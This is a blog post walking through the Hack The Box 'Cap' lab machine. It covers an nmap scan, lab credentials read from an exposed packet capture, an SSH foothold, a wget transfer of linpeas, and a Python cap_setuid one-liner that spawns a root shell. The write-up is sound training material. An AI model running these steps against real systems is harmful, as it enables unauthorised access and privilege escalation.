<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/thecybersecurityblog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=thecybersecurityblog/livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Hack The Box: Cap | The Cyber Security Blog</title>
<meta name="keywords" content="">
<meta name="description" content="Let ip_address=10.10.10.10.
Scan the machine with nmap.
sudo nmap -sS -sV -sC -T4 -v -Pn 10.10.10.10Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 14:55 EDTNSE: Loaded 156 scripts for scanning.NSE: Script Pre-scanning.Initiating NSE at 14:55Completed NSE at 14:55, 0.00s elapsedInitiating NSE at 14:55Completed NSE at 14:55, 0.00s elapsedInitiating NSE at 14:55Completed NSE at 14:55, 0.">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/thecybersecurityblog/docs/htb_cap/">
<link crossorigin="anonymous" href="/thecybersecurityblog/assets/css/stylesheet.79112176b8c2cef599ca604236706c81a7be13fe98e3c4f69d839f5f91e6a942.css" integrity="sha256-eREhdrjCzvWZymBCNnBsgae&#43;E/6Y48T2nYOfX5HmqUI=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/thecybersecurityblog/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/thecybersecurityblog/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/thecybersecurityblog/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/thecybersecurityblog/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/thecybersecurityblog/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/thecybersecurityblog/docs/htb_cap/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

    <nav class="nav">
        <div class="head-class">
            <div class="logo">
                <a href="http://localhost:1313/thecybersecurityblog/" accesskey="h" title="The Cyber Security Blog (Alt + H)">The Cyber Security Blog</a>
                
            </div>
            <ul id="menu">
                
                <li>
                    <a href="http://localhost:1313/thecybersecurityblog/" title="Home">
                        <span>Home</span>
                    </a>
                </li>
                
                    <li>|</li>
                
                <li>
                    <a href="http://localhost:1313/thecybersecurityblog/blog/" title="Blog">
                        <span>Blog</span>
                    </a>
                </li>
                
                    <li>|</li>
                
                <li>
                    <a href="http://localhost:1313/thecybersecurityblog/tags/" title="Tags">
                        <span>Tags</span>
                    </a>
                </li>
                
                    <li>|</li>
                
                <li>
                    <a href="http://localhost:1313/thecybersecurityblog/about/" title="About">
                        <span>About</span>
                    </a>
                </li>
                
            </ul>
        </div>
    </nav>
</header>
<main class="main">

<article class="post-single">

  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Hack The Box: Cap
    </h1>
    <div class="post-meta"><span title='2024-11-01 22:59:51 +0200 EET'>01 Nov 2024</span>

</div>
  </header>
  <div class="card-list" onclick="location.href='https:\/\/www.hackthebox.com\/achievement\/machine\/2124852\/351';" style="cursor: pointer;">
    <article class="card">
      <figure class="card-image">
        <img class=card-image src="cap_cert.png" alt="Cert" />
      </figure>
      <div class="card-header">
        <a href="https://www.hackthebox.com/achievement/machine/2124852/351">Owned Cap from Hack The Box</a>
      </div>
      <div class="card-content">
         I have just gained ownership of Cap machine from Hack The Box
      </div>
      <div class="card-footer">
        Hack The Box
      </div>
    </article>
  </div> 
  <div class="post-content"><p>Let ip_address=10.10.10.10.<br>
Scan the machine with nmap.</p>
<pre tabindex="0"><code class="language-nmap" data-lang="nmap">sudo nmap -sS -sV -sC -T4 -v -Pn 10.10.10.10

Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 14:55 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:55
Completed NSE at 14:55, 0.00s elapsed
Initiating NSE at 14:55
Completed NSE at 14:55, 0.00s elapsed
Initiating NSE at 14:55
Completed NSE at 14:55, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:55
Completed Parallel DNS resolution of 1 host. at 14:55, 0.02s elapsed
Initiating SYN Stealth Scan at 14:55
Scanning 10.10.10.245 [1000 ports]
Discovered open port 22/tcp on 10.10.10.245
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
Completed SYN Stealth Scan at 14:55, 3.58s elapsed (1000 total ports)
Initiating Service scan at 14:55
Scanning 3 services on 10.10.10.245
Completed Service scan at 14:57, 135.22s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.245.
Initiating NSE at 14:57
Completed NSE at 14:57, 12.21s elapsed
Initiating NSE at 14:57
Completed NSE at 14:57, 1.16s elapsed
Initiating NSE at 14:57
Completed NSE at 14:57, 0.01s elapsed
Nmap scan report for 10.10.10.245
Host is up (0.065s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Security Dashboard
|_http-server-header: gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Fri, 01 Nov 2024 18:55:40 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 01 Nov 2024 18:55:27 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     &lt;!DOCTYPE html&gt;
|     &lt;html class=&#34;no-js&#34; lang=&#34;en&#34;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&#34;utf-8&#34;&gt;
|     &lt;meta http-equiv=&#34;x-ua-compatible&#34; content=&#34;ie=edge&#34;&gt;
|     &lt;title&gt;Security Dashboard&lt;/title&gt;
|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
|     &lt;link rel=&#34;shortcut icon&#34; type=&#34;image/png&#34; href=&#34;/static/images/icon/favicon.ico&#34;&gt;
|     &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/bootstrap.min.css&#34;&gt;
|     &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/font-awesome.min.css&#34;&gt;
|     &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/themify-icons.css&#34;&gt;
|     &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/metisMenu.css&#34;&gt;
|     &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/owl.carousel.min.css&#34;&gt;
|     &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/slicknav.min.css&#34;&gt;
|     &lt;!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 01 Nov 2024 18:55:31 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;title&gt;Bad Request&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;
|     &lt;/body&gt;
|_    &lt;/html&gt;
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=11/1%Time=67252411%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,4C56,&#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\
SF:x20Fri,\x2001\x20Nov\x202024\x2018:55:27\x20GMT\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:19386\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&#34;no-js\&#34;\x20lang=\&#34;en\
SF:&#34;&gt;\n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20
SF:\x20&lt;meta\x20http-equiv=\&#34;x-ua-compatible\&#34;\x20content=\&#34;ie=edge\&#34;&gt;\n\x
SF:20\x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;me
SF:ta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-sca
SF:le=1\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;shortcut\x20icon\&#34;\x20type=\&#34;im
SF:age/png\&#34;\x20href=\&#34;/static/images/icon/favicon\.ico\&#34;&gt;\n\x20\x20\x20\x
SF:20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/static/css/bootstrap\.min\.css
SF:\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/static/css/
SF:font-awesome\.min\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\
SF:x20href=\&#34;/static/css/themify-icons\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20r
SF:el=\&#34;stylesheet\&#34;\x20href=\&#34;/static/css/metisMenu\.css\&#34;&gt;\n\x20\x20\x20
SF:\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/static/css/owl\.carousel\.mi
SF:n\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/stati
SF:c/css/slicknav\.min\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&#34;)%r(HTTPOpt
SF:ions,B3,&#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Fri,
SF:\x2001\x20Nov\x202024\x2018:55:31\x20GMT\r\nConnection:\x20close\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x2
SF:0OPTIONS\r\nContent-Length:\x200\r\n\r\n&#34;)%r(RTSPRequest,121,&#34;HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t
SF:ext/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\
SF:x20\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;bod
SF:y&gt;\n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Inv
SF:alid\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;R
SF:TSP/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;)%r(FourOhFourRequest,
SF:189,&#34;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Fri,\x2001\x20Nov\x202024\x2018:55:40\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x202
SF:32\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x203\.2\
SF:x20Final//EN\&#34;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/
SF:h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20
SF:server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2
SF:0check\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&#34;);
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>A few interesting things are:</p>
<ul>
<li>port 21 ftp server (maybe we can login as anonymous, with no credentials)</li>
<li>port 80 http server (navigate through the website to find vulnerablities)</li>
<li>gunicorn, search for exploits depending on the running version</li>
</ul>
<p>First let&rsquo;s try to login to ftp.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp 10.10.10.10 <span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span>USER anonymous <span style="color:#75715e"># (try also USER &lt;nothing just press enter&gt;)</span>
</span></span><span style="display:flex;"><span>PASS &lt;nothing press enter&gt;
</span></span></code></pre></div><p>No luck, failed to login. Next step is to check this gunicorn server, which is a Python based server.
Let&rsquo;s head to <code>http://10.10.10.10/</code>.
<img loading="lazy" src="lab1.png" alt="lab"  />
</p>
<p>If we go to &ldquo;Security Snapshot (5 Second PCAP + Analysis)&rdquo; page there is download button which seems to download a <code>.pcap</code>. Open wireshark to inspect this file.</p>
<p><img loading="lazy" src="lab2.png" alt="wireshark"  />
</p>
<p>This is HTTP traffic from us. So there isn&rsquo;t anything usefull here. If we inspect the GET request of the browser when clicking the download button, we can see it is <code>http://10.10.10.10/download/4</code>, hence the form is <code>/download/&lt;id&gt;</code></p>
<p><img loading="lazy" src="lab3.png" alt="wireshark"  />
</p>
<p>The id is incremented for every capture. It&rsquo;s possible that there were packet captures from users before us.
Browsing to <code>/data/0</code> does indeed reveal a packet capture with multiple packets.</p>
<p><img loading="lazy" src="lab4.png" alt="wireshark"  />
</p>
<p>The traffic is not encrypted so we can get the username and password combination easily, <code>nathan:Buck3tH4TF0RM3</code>.
Now let&rsquo;s try to ssh.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh nathan@10.10.10.10
</span></span></code></pre></div><p>We got a foothold into the system and found the user <code>flag.txt</code>.</p>
<p>So now we need to find a way to get root access. The system has already linpeas.sh script which we can use to do a fast scan for any previlege escalation opening.</p>
<p>Note: If linpeas.sh wasn&rsquo;t in the attacking system we could transfer it from our Kali with a web server <code>python3 -m http.server 1234</code> and download it in the attacking system with <code>wget http://&lt;ip_address&gt;:1234/linpeas.sh</code></p>
<p>One very interesting result from <code>linpeas.sh</code> is at the <code>Capabilities section</code></p>
<p><img loading="lazy" src="lab5.png" alt="capabilities"  />
</p>
<p><code>/usr/bin/python3.8</code> has set <code>cap_setuid</code></p>
<p><img loading="lazy" src="lab6.png" alt="alt"  />
</p>
<p>So if we execute, we should get root previleges.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/python3.8 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.system(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><p>We just gained ownership of the Cap Mahcine!!</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="http://localhost:1313/thecybersecurityblog/">The Cyber Security Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
